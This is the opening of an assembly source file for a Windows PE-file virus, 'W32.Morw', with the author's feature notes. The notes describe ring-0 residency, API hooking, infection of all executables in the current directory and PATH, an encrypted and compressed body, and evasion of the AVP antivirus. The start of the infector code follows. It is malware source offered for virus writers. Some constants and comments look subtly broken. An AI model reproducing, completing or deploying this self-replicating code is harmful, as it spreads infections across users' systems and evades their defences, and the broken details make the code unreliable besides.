;[W32.Morw] - One more by Slave to Grav
;(c) 10th of November '99 .. mexican time.
;
;I'm publishing this source cause I think it's interesting, though not so like as
;my other virii. It infects PE files (windows executables), resident part of the
;virus is encrypted with variable key and offset, using RND algorithm. If you 
;like to read something about virus writing, go on reading, if you don't, then
;go away please :)
;
;Some features:    
;	- Resident under WinNT/2k/95/98 (in kernel memory)
;	- Per-process residentification (only for NT/2K hosts). This was needed,
;	  becoz under W9x virus can't become thread in another process
;	- Infects all PE EXE/DLL in current directory and all paths set up in 
;	  PATH environment variable (first found wins!). Infection mark is Size
;	  modifiation date (1st bit set).
;	- Hooked functions are checked for API correctness (size & name)
;	- Uses CRC32 instead of normal compares whereever possible
;	- Under Windows 9X uses VMM manager APIs (VxDCall/VxDGet32IntVec etc.) 
;	  for accessing non-DOSVR vector from DPMI host. Under NT/2K hooks VxD
;	  service in IDT table which services DOSVR (service #104 = VIDEOMEM_ALLOC,
;	  aka AllocateVideoMemory)
;	- Virus body is compressed with LZW algoritm. Virus doesn't use any
;	  compression engine or libraries (ie., SmartACE, UPX,...). Compression
;	  ratio is around 75%
;	
;Payload: MessageBox with some text :) 
;
;AVP (scanv155.exe) behavior report looks good. After running infected file
;VDEF ends scanning and goes into "waiting mode" (no red flag at first generation),
;after 1st generation, after 15 minutes of system work, no red flags appears again.
;After second generation, 1 hour later, no redflags appear again. And so on..
;That means that virus updates its signature database every 16 generations.
;Also AVP heuristic detects only very few of virus generations.
;
;This is my first NT ring-0 virus, so maybe there're bugs i couldn't detect ;)
;I tested it under Windows NT 4.0 SP6a and Windows 98 SE. It should work also
;under other windows versions, but i didn't try that out.
;
;This is original disassembly done in Visual Studio 6.0 with incremental linker
;and /DEBUG option turned on. All comments were added by hand. Sorry, but i
;didn't have access to debugger like Insight or SoftICE :(
;Disassembler HEEVA was used for analysis. Source code was optimized a little bit
;to make better disassembly. For example, main routine wasn't put inside main PE
;section, but outside of it. Also some routines (hooking routine especially)
;were made separate code blocks too.

.586p						;IA-32e instructions
.model flat					;32-bit model

include PE.inc					;include some useful includes
include MZ.inc					
include Useful.inc		
include MyOwnMacros.inc	

extrn	MessageBoxA:PROC			;declare externals
extrn	GetSystemTime:PROC			
extrn	lstrcpyA:PROC				
extrn	CopyFileA:PROC			
extrn	DeleteFileA:PROC			
extrn	SetCurrentDirectoryA:PROC		
extrn	CreateProcessA:PROC		
extrn	RaiseException:PROC			

.code						;code section
assume fs:_DATA					;set correct segments

VIRTUAL						;define fake imagebase for relocat.
Virussize EQU ((offset Vend-offset omain)+2*1024); define size of virus
VirusSizePage EQU (((offset Vend-offset omain)/1024)+1)*1024 

oMain:				;start of virus code
	db	'Morw',0h,0h,'by Slave to Grav',0h
	db	9,'http://slave.mutate.net'
	jmp	Main
	
OldEH dd 0hhb					;save old exception handler addres here
	
DebugMode db 0h    				;debug mode flag
	
SysCallTable	dd ?  	       		;syscalls addresses will be placed here
	
HookedApis:					;API names array starts here
	push esi
	mov esi,offset CreateProcessANam
	call PutApiName
